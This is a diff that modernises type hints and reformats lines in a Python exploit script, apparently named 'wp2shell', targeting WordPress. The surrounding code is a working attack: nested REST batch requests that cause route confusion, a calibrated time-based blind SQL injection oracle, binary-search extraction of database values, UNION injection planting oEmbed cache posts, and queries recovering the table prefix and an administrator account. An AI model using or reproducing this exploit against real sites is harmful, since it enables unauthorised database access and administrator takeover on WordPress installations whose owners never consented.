@@ -25,8 +25,8 @@ import urllib.error
 import urllib.parse
 import urllib.request
 import uuid
-from typing import Any, Dict, List, Optional, Sequence, Tuple
-
+from collections.abc import Sequence
+from typing import Any
 
 DEFAULT_DELAY = 0.4
 DEFAULT_TIMEOUT = 30.0
@@ -67,7 +67,9 @@ def target_url(value: str) -> str:
             "target must be an absolute HTTP(S) URL, for example http://127.0.0.1:8080"
         )
     if parsed.query or parsed.fragment:
-        raise argparse.ArgumentTypeError("target must not contain a query string or fragment")
+        raise argparse.ArgumentTypeError(
+            "target must not contain a query string or fragment"
+        )
 
     path = parsed.path.rstrip("/")
     return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))
@@ -89,7 +91,9 @@ def build_parser() -> argparse.ArgumentParser:
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    parser.add_argument("target", type=target_url, help="base URL of the WordPress site")
+    parser.add_argument(
+        "target", type=target_url, help="base URL of the WordPress site"
+    )
     parser.add_argument(
         "-c",
         "--check",
@@ -185,8 +189,8 @@ class Wp2ShellExploit:
         self.batch_url = f"{base_url}/?rest_route=/batch/v1"
         self.sleep_delay = delay
         self.timeout = timeout
-        self.threshold: Optional[float] = None
-        self.retry_band: Optional[float] = None
+        self.threshold: float | None = None
+        self.retry_band: float | None = None
 
     def request(self, url: str) -> bytes:
         """Send a GET request and return its response body."""
@@ -194,7 +198,7 @@ class Wp2ShellExploit:
         with urllib.request.urlopen(request, timeout=self.timeout) as response:
             return response.read()
 
-    def send_batch(self, inner_requests: Sequence[Dict[str, Any]]) -> bytes:
+    def send_batch(self, inner_requests: Sequence[dict[str, Any]]) -> bytes:
         """Wrap sub-requests in the nested batch that triggers route confusion.
 
         The first outer sub-request cannot be parsed. WordPress records its
@@ -240,16 +244,14 @@ class Wp2ShellExploit:
         )
         return time.perf_counter() - started
 
-    def calibrate(self) -> Tuple[float, float]:
+    def calibrate(self) -> tuple[float, float]:
         """Calibrate the timing oracle and confirm that the target is vulnerable."""
         for _ in range(3):
             fast_samples = [self.probe_time("1=0") for _ in range(5)]
             slow_samples = [self.probe_time("1=1") for _ in range(3)]
             fast = statistics.median(fast_samples)
             slow = statistics.median(slow_samples)
-            jitter = statistics.median(
-                abs(sample - fast) for sample in fast_samples
-            )
+            jitter = statistics.median(abs(sample - fast) for sample in fast_samples)
             if slow - fast > max(0.06, jitter * 8):
                 self.threshold = (fast + slow) / 2
                 self.retry_band = max(0.02, jitter * 3)
@@ -275,9 +277,7 @@ class Wp2ShellExploit:
         lower, upper = 0, max_length
         while lower < upper:
             middle = (lower + upper + 1) // 2
-            if self.condition_is_true(
-                f"CHAR_LENGTH({expression}) >= {middle}"
-            ):
+            if self.condition_is_true(f"CHAR_LENGTH({expression}) >= {middle}"):
                 lower = middle
             else:
                 upper = middle - 1
@@ -287,9 +287,7 @@ class Wp2ShellExploit:
             low, high = 32, 126
             while low < high:
                 middle = (low + high + 1) // 2
-                condition = (
-                    f"ASCII(SUBSTRING({expression},{position},1)) >= {middle}"
-                )
+                condition = f"ASCII(SUBSTRING({expression},{position},1)) >= {middle}"
                 if self.condition_is_true(condition):
                     low = middle
                 else:
@@ -330,7 +328,7 @@ class Wp2ShellExploit:
             )
         return str(items[0]["link"])
 
-    def seed_oembed_posts(self, public_post_link: str) -> Tuple[str, List[str]]:
+    def seed_oembed_posts(self, public_post_link: str) -> tuple[str, list[str]]:
         """Create three real oEmbed cache posts and return their source URLs."""
         token = secrets.token_hex(6)
         public_post = urllib.parse.urlsplit(public_post_link)
@@ -347,8 +345,7 @@ class Wp2ShellExploit:
             for index in range(3)
         ]
         seed_content = "".join(
-            f'[embed width="500" height="750"]{url}[/embed]'
-            for url in embed_urls
+            f'[embed width="500" height="750"]{url}[/embed]' for url in embed_urls
         )
         seed_query = (
             "1) AND 1=0 UNION ALL SELECT "
@@ -375,7 +372,7 @@ class Wp2ShellExploit:
         )
         return token, embed_urls
 
-    def recover_database_context(self) -> Tuple[str, str, int]:
+    def recover_database_context(self) -> tuple[str, str, int]:
         """Recover the posts table, table prefix, and an administrator user ID."""
         posts_table = self.get_scalar(
             "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
@@ -402,7 +399,7 @@ class Wp2ShellExploit:
 
     def recover_cache_post_ids(
         self, posts_table: str, embed_urls: Sequence[str]
-    ) -> List[int]:
+    ) -> list[int]:
         """Recover the database IDs of the newly created oEmbed cache posts."""
         embed_size = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
         cache_post_ids = []
@@ -576,9 +573,7 @@ class Wp2ShellExploit:
             f"JOIN `{table_prefix}usermeta` m ON m.user_id=u.ID "
             f"WHERE u.user_login={sql_hex(username)} "
             f"AND m.meta_key={sql_hex(table_prefix + 'capabilities')} "
-            "AND INSTR(m.meta_value,"
-            + sql_hex('s:13:"administrator";b:1;')
-            + ")>0)"
+            "AND INSTR(m.meta_value," + sql_hex('s:13:"administrator";b:1;') + ")>0)"
         )
         return self.condition_is_true(condition)
 
@@ -651,7 +646,7 @@ def run(args: argparse.Namespace) -> None:
     print(f"    Email:    {email}")
 
 
-def main(argv: Optional[Sequence[str]] = None) -> int:
+def main(argv: Sequence[str] | None = None) -> int:
     """Parse command-line arguments and return a process exit code."""
     parser = build_parser()
     args = parser.parse_args(argv)
